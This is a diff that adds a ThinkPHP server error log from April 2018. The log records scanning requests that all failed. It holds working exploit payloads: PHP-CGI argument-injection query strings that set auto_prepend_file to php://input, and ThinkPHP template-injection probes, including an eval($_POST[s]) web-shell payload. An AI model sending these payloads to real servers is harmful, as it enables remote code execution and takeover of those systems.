@@ -1,0 +1,33 @@
+[ 2018-04-19T06:35:34+08:00 ] 222.186.174.95 /invoker/readonly
+ERR: 无法加载控制器:Invoker
+
+[ 2018-04-19T13:26:17+08:00 ] 47.96.249.203 /cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+disable_functions%3D%22%22+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dphp%3A%2F%2Finput+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n
+ERR: 无法加载控制器:Cgi-bin
+
+[ 2018-04-19T13:26:17+08:00 ] 47.96.249.203 /cgi-bin/php5?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+disable_functions%3D%22%22+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dphp%3A%2F%2Finput+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n
+ERR: 无法加载控制器:Cgi-bin
+
+[ 2018-04-19T13:26:17+08:00 ] 47.96.249.203 /cgi-bin/php-cgi?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+disable_functions%3D%22%22+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dphp%3A%2F%2Finput+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n
+ERR: 无法加载控制器:Cgi-bin
+
+[ 2018-04-19T13:26:17+08:00 ] 47.96.249.203 /cgi-bin/php.cgi?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+disable_functions%3D%22%22+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dphp%3A%2F%2Finput+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n
+ERR: 无法加载控制器:Cgi-bin
+
+[ 2018-04-19T13:26:17+08:00 ] 47.96.249.203 /cgi-bin/php4?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+disable_functions%3D%22%22+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dphp%3A%2F%2Finput+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n
+ERR: 无法加载控制器:Cgi-bin
+
+[ 2018-04-19T15:30:01+08:00 ] 47.97.0.146 /index.php/module/aciton/param1/$%7B@print(THINK_VERSION)%7D
+ERR: 无法加载控制器:Module
+
+[ 2018-04-19T15:30:01+08:00 ] 47.97.0.146 /index.php/module/aciton/param1/$%7B@phpinfo()%7D
+ERR: 无法加载控制器:Module
+
+[ 2018-04-19T15:30:01+08:00 ] 47.97.0.146 /index.php/module/aciton/param1/$%7B@function_all()%7D
+ERR: 无法加载控制器:Module
+
+[ 2018-04-19T15:30:01+08:00 ] 47.97.0.146 /index.php/module/action/param1/%7B$%7Beval($_POST[s])%7D%7D
+ERR: 无法加载控制器:Module
+
+[ 2018-04-19T15:54:25+08:00 ] 47.97.68.118 /index.php/module/aciton/param1/$%7B@phpinfo()%7D
+ERR: 无法加载控制器:Module
+
